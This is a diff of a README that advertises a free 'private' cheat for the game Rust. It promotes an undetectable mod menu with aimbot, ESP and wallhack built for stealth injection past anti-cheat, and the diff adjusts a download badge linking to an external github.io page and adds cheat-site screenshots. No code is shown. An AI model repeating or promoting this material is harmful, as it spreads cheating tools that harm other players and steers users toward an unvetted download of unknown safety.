@@ -2,11 +2,12 @@
 
 🔥 Dominate **Rust** with the **Free Private Cheat**, an undetectable mod menu featuring ESP, aimbot, radar, and wallhack. Built for stealth and smooth gameplay, this cheat is optimized for private use and updated frequently to match the latest Rust patches.  
 
-![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)  
 
-[![Download Rust Free Private Cheat](https://img.shields.io/badge/Download-Rust%20Free%20Private%20Cheat-yelloviolet)](https://bestsoftonik.github.io/public/)  
+[![Download Rust Free Private Cheat](https://img.shields.io/badge/Download-Rust%20Free%20Private%20Cheat-greenyellow)](https://bestsoftonik.github.io/public/)  
 
 ---
+
+![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)  
 
 ## 🎯 What’s Rust Free Private Cheat All About?  
 
@@ -15,6 +16,12 @@ Unlike public hacks, it’s designed for **stealth injection**, making it harder
 
 It’s built as a **private mod menu & exploit hub**, delivering real-time control and customizable settings.  
 
+## 📸 Screenshots  
+ 
+![Dashboard](https://burgercheats.com/uploads/monthly_2025_04/5.thumb.webp.4a6c8bcbb4a0321b8188c84d062d52d5.webp)  
+
+**Aimbot Interface**  
+![Aimbot Interface](https://burgercheats.com/uploads/monthly_2025_04/8.thumb.webp.caccbc72fa79c8d9ac4a5ceffa8dad52.webp)
 ---
 
 ## 🛠 Key Features  
